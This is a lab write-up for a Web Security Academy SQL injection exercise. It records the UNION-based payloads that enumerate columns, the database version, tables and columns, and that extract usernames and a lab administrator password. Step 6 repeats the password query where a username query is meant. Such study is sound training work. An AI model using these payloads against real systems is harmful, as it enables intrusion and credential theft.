# SQL injection UNION attack, retrieving multiple values in a single column

1. SQLi:
    - product category filter.
    - The database contains a different table called users.
    - columns called username and password.
2. Goal:
    - retrieves all usernames and passwords.
    - log in as the `administrator` user.

### Analysis
- Website target: `https://0a13001804cd39268031d00a00d7009a.web-security-academy.net/`
- Use Burp suite.
- `ctrl + u`: URL encode.

1. Find the number of columns.
```sql
' order by 2--
'-- I found 2 columns.
```

2. Find the data type of these columns.
```sql
' union select null, 'a'--
'-- I found 1 from 2 columns data type is text.
```

3. Find the version of database.
```sql
SELECT version() --PostgreSQL

' UNION SELECT NULL, version()--
'-- PostgreSQL 12.16
```

4. Output the list of table names from database.
```sql
SELECT * FROM information_schema.tables

' UNION SELECT NULL, TABLE_NAME FROM information_schema.tables--
'-- Table name: users.
```

5. Output the column names from the table.
```sql
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

' UNION SELECT NULL, COLUMN_NAME FROM information_schema.columns WHERE table_name = 'users'--
'-- Column names: username and password.
```

6. Output usernames and passwords.
```sql
' union select null, password from users--
'-- Username: administrator

' union select null, password from users--
'-- Password: qkwf0l5a5727i9qrlsau
```